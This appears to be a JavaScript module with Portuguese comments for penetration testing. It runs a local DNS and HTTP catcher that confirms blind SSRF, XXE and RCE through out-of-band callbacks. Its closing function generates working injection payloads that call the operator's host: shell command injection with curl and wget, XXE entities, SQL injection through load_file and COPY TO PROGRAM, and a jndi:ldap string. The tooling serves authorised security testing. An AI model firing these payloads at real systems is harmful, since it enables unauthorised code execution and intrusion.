/**
 * OOB collaborator local — DNS+HTTP catcher para confirmar SSRF/XXE/RCE blind.
 *
 * NÃO é um interactsh remoto — é um catcher LOCAL que escuta numa porta/IP do
 * operador (geralmente VPN/lab). O operador injeta URLs como
 * `http://<token>.<host>:<port>/probe` em payloads e correlaciona hits aqui.
 *
 * Uso típico:
 *   const cat = await startCatcher({ port: 8053, host: '0.0.0.0' });
 *   const t = cat.mintToken({ note: 'SSRF /api/preview' });
 *   // injeta: `http://${t.token}.${cat.publicHost}:${cat.port}/p`
 *   ...
 *   const hits = await cat.waitForToken(t.token, { timeoutMs: 30_000 });
 *   await cat.stop();
 */

import http from 'node:http';
import dgram from 'node:dgram';
import crypto from 'node:crypto';

function newToken() {
  return crypto.randomBytes(8).toString('hex');
}

function nowIso() { return new Date().toISOString(); }

/**
 * Heurística mínima de DNS query parser — extrai labels da pergunta.
 * Não valida classes/types completos; só queremos o nome.
 */
export function parseDnsQuery(buf) {
  if (!Buffer.isBuffer(buf) || buf.length < 13) return null;
  const id = buf.readUInt16BE(0);
  let off = 12;
  const labels = [];
  let safety = 0;
  while (off < buf.length && safety++ < 64) {
    const len = buf[off];
    if (len === 0) { off += 1; break; }
    if (len > 63) return null; // pointer/comp não suportado aqui
    if (off + 1 + len > buf.length) return null;
    labels.push(buf.slice(off + 1, off + 1 + len).toString('utf8'));
    off += 1 + len;
  }
  return { id, name: labels.join('.').toLowerCase() };
}

/**
 * Constrói uma resposta DNS "NXDOMAIN/empty" simples, mas com o ID copiado
 * para que o resolver não retransmita.
 */
function buildDnsAnswer(reqBuf) {
  if (!reqBuf || reqBuf.length < 12) return Buffer.alloc(0);
  const out = Buffer.from(reqBuf);
  // QR=1, RA=1, RCODE=0 (no answer because we ANCOUNT=0)
  out[2] = out[2] | 0x80;
  out[3] = (out[3] & 0xf0) | 0x00;
  return out;
}

export async function startCatcher({
  port = 8053,
  httpPort = 8054,
  host = '127.0.0.1',
  publicHost = '127.0.0.1',
  // se !startDns/startHttp, não abre o socket correspondente
  startDns = true,
  startHttp = true,
} = {}) {
  const tokens = new Map(); // token -> { meta, hits: [] }
  const waiters = new Map(); // token -> [resolve(...)]

  function recordHit(kind, token, hit) {
    const h = { kind, at: nowIso(), ...hit };
    const slot = tokens.get(token);
    if (slot) {
      slot.hits.push(h);
      const ws = waiters.get(token) || [];
      while (ws.length) ws.shift()(slot.hits.slice());
    } else {
      // hit sem token registrado — guarda em bucket "unknown"
      const unk = tokens.get('__unknown__') || { meta: { note: 'unknown hits' }, hits: [] };
      unk.hits.push(h);
      tokens.set('__unknown__', unk);
    }
  }

  function tokenFromHost(host) {
    if (!host) return null;
    const parts = String(host).toLowerCase().split('.');
    return parts[0] && /^[a-f0-9]{16}$/.test(parts[0]) ? parts[0] : null;
  }

  let dnsSock = null, httpSrv = null;

  if (startDns) {
    dnsSock = dgram.createSocket('udp4');
    dnsSock.on('message', (msg, rinfo) => {
      const q = parseDnsQuery(msg);
      const tok = q ? tokenFromHost(q.name) : null;
      recordHit('dns', tok || '__unknown__', {
        query: q?.name || null, src: `${rinfo.address}:${rinfo.port}`,
      });
      try { dnsSock.send(buildDnsAnswer(msg), rinfo.port, rinfo.address); } catch {}
    });
    await new Promise((res, rej) => {
      dnsSock.once('error', rej);
      dnsSock.bind(port, host, () => res());
    });
  }

  if (startHttp) {
    httpSrv = http.createServer((req, res) => {
      const tok = tokenFromHost(req.headers.host) || tokenFromUrl(req.url);
      let body = '';
      req.on('data', (c) => { body += c; if (body.length > 8192) body = body.slice(0, 8192); });
      req.on('end', () => {
        recordHit('http', tok || '__unknown__', {
          method: req.method, url: req.url, host: req.headers.host,
          ua: req.headers['user-agent'], headers: redact(req.headers), body,
        });
        res.writeHead(200, { 'content-type': 'text/plain' });
        res.end('ok\n');
      });
    });
    await new Promise((res, rej) => {
      httpSrv.once('error', rej);
      httpSrv.listen(httpPort, host, () => {
        httpPort = httpSrv.address().port;
        res();
      });
    });
  }
  if (startDns && dnsSock) {
    port = dnsSock.address().port;
  }

  function tokenFromUrl(url) {
    const m = String(url || '').match(/[?&/](?:t|token)=([a-f0-9]{16})/);
    return m ? m[1] : null;
  }

  return {
    publicHost, port, httpPort, host,
    mintToken(meta = {}) {
      const token = newToken();
      tokens.set(token, { meta: { ...meta, mintedAt: nowIso() }, hits: [] });
      return {
        token,
        // payloads prontos para colar
        dnsHost: `${token}.${publicHost}`,
        httpUrl: `http://${publicHost}:${httpPort}/?t=${token}`,
        httpsUrl: `https://${publicHost}:${httpPort}/?t=${token}`, // requer TLS terminator externo
      };
    },
    listTokens() {
      return Array.from(tokens.entries()).map(([token, v]) => ({
        token, hits: v.hits.length, meta: v.meta,
      }));
    },
    hits(token) {
      return (tokens.get(token)?.hits || []).slice();
    },
    waitForToken(token, { timeoutMs = 15_000 } = {}) {
      const slot = tokens.get(token);
      if (slot && slot.hits.length) return Promise.resolve(slot.hits.slice());
      return new Promise((res) => {
        const arr = waiters.get(token) || [];
        arr.push(res);
        waiters.set(token, arr);
        setTimeout(() => res((tokens.get(token)?.hits || []).slice()), timeoutMs);
      });
    },
    async stop() {
      try { dnsSock?.close(); } catch {}
      try { await new Promise((r) => httpSrv?.close(() => r())); } catch {}
    },
  };
}

function redact(headers) {
  const out = {};
  for (const [k, v] of Object.entries(headers || {})) {
    if (/cookie|authorization|x-api-key|x-auth/i.test(k)) out[k] = '<redacted>';
    else out[k] = v;
  }
  return out;
}

/**
 * Helper para módulos ofensivos: dado um host público + token, gera os
 * payloads canónicos de OOB exfil.
 */
export function buildOobPayloads({ token, host, httpPort = 8054 }) {
  const dns = `${token}.${host}`;
  const http = `http://${host}:${httpPort}/?t=${token}`;
  return {
    ssrf: [http, `http://${dns}`, `gopher://${dns}/_test`],
    xxe: [
      `<!ENTITY x SYSTEM "${http}">`,
      `<!ENTITY % p SYSTEM "${http}/dtd"> %p;`,
    ],
    rceShell: [
      `curl ${http}`, `wget ${http}`, `nslookup ${dns}`,
      `;curl ${http};`, `\`curl ${http}\``, `$(curl ${http})`,
    ],
    sqliBlind: [
      `'; SELECT load_file('\\\\\\\\${dns}\\\\x'); --`,
      `'; COPY (SELECT '') TO PROGRAM 'curl ${http}'; --`,
    ],
    logInjection: [`{{ ${http} }}`, `\${jndi:ldap://${dns}/x}`],
  };
}
